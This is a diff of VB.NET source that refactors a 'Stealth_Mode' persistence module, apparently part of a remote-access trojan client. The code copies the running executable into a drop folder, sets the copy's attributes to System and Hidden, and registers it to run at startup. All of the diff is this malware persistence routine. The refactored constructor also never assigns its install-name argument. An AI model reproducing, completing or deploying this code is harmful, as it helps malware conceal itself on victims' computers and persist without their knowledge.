@@ -1,29 +1,38 @@
 ﻿Imports System.IO
 Namespace Persistence
-    Module Stealth_Mode
-        Public Sub Install_Server()
+    Public Class Stealth_Mode
+        Public DropPath As String
+        Public InstallName As String
+        Public StartName As String
+        Public Sub New(ByVal droPath As String, ByVal insName As String, ByVal StartupName As String)
+            DropPath = droPath
+            StartName = StartupName
+        End Sub
+        Public Function Install_Server()
             Try
-                Dim DropPath As String = Environ(Form1.PathS) & "\Microsoft\MyClient\"
                 If Not (Directory.Exists(DropPath)) Then
                     Directory.CreateDirectory(DropPath)
                 End If
-                If File.Exists(DropPath & Form1.InstallName) Then
-                    File.Delete(DropPath & Form1.InstallName)
+                If File.Exists(DropPath & InstallName) Then
+                    File.Delete(DropPath & InstallName)
                 End If
-                Melt(DropPath & Form1.InstallName)
-            Catch ex As Exception
+                Melt(DropPath & InstallName)
 
+                Return True
+            Catch ex As Exception
+                Return False
             End Try
-        End Sub
-        Public Sub Melt(filename As String)
+        End Function
+        Public Function Melt(filename As String)
             Try
                 File.Copy(Application.ExecutablePath, filename, True)
                 File.SetAttributes(filename, FileAttributes.System + FileAttributes.Hidden)
-                AStartup(Form1.StartName, filename)
+                AStartup(StartName, filename)
+
+                Return True
             Catch ex As Exception
-
+                Return False
             End Try
-        End Sub
-    End Module
-
+        End Function
+    End Class
 End Namespace
